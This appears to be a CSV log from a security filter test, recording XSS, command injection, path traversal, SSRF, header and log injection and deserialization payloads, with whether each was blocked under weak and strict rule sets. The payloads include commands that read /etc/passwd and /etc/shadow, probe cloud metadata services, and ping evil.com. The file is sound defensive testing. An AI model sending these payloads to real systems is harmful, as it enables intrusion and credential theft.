timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,http_handler,response_body
2025-10-13T15:11:46.249264,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.255214,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.364349,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.370983,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.480760,Cmd Injection,Simple Pipe,| whoami,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:46.487953,Cmd Injection,Simple Pipe,| whoami,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:46.597167,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.603611,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.709777,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.714493,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.822799,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:46.830161,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:46.939466,Cmd Injection,Backticks,`uname -a`,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.946937,Cmd Injection,Backticks,`uname -a`,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:11:47.056644,Cmd Injection,Command Substitution,$(reboot),Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.063216,Cmd Injection,Command Substitution,$(reboot),Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.172413,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.178875,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.284808,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:11:47.291011,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:11:47.399661,Path Traversal,Root Directory,/etc/shadow,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.406414,Path Traversal,Root Directory,/etc/shadow,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.514454,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:11:47.521346,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:11:47.630783,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.637113,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.746476,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.750635,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:47.858168,Path Traversal,Null Byte,../../etc/passwd%00,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:11:47.865011,Path Traversal,Null Byte,../../etc/passwd%00,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:11:47.972279,SSRF,Localhost,http://localhost/admin,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:11:47.978637,SSRF,Localhost,http://localhost/admin,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.084636,SSRF,127.0.0.1,http://127.0.0.1:8080,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.090851,SSRF,127.0.0.1,http://127.0.0.1:8080,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.199926,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.206081,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.315188,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.321850,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.428991,SSRF,Internal IP,http://10.0.0.1/,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:48.435836,SSRF,Internal IP,http://10.0.0.1/,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:48.543123,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Comments/Bypass"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.549890,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Comments/Bypass"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.658871,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.665897,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.771655,Deserialization,Java RMI Header,JRMI,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.777910,Deserialization,Java RMI Header,JRMI,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:11:48.887219,Deserialization,Python Pickle,"cposix
system
",Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:48.893517,Deserialization,Python Pickle,"cposix
system
",Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:49.002699,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:11:49.009656,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
